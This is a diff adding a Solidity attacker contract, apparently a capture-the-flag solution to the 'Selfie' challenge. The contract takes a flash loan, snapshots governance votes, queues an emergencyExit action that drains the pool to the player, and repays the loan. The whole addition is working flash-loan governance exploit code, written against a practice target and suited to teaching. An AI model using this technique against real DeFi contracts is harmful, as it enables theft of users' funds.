@@ -73,3 +73,39 @@ contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
         emit FundsDrained(receiver, amount);
     }
 }
+
+contract SelfiePoolAttacker is IERC3156FlashBorrower {
+    SelfiePool pool;
+    DamnValuableTokenSnapshot snapshotToken;
+    SimpleGovernance governance;
+    address player;
+
+    constructor(SelfiePool _pool) {
+        pool = _pool;
+        snapshotToken = DamnValuableTokenSnapshot(address(pool.token()));
+        governance = pool.governance();
+        player = msg.sender;
+    }
+
+    /// @dev get a flash loan and take a snapshot, then queue the action to drain the pool (emergencyExit)
+    function attack() public {
+        pool.flashLoan(this, address(snapshotToken), 1_500_000 ether, "");
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        snapshotToken.snapshot();
+        governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature("emergencyExit(address)", player)
+        );
+        snapshotToken.approve(address(pool), 1_500_000 ether);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
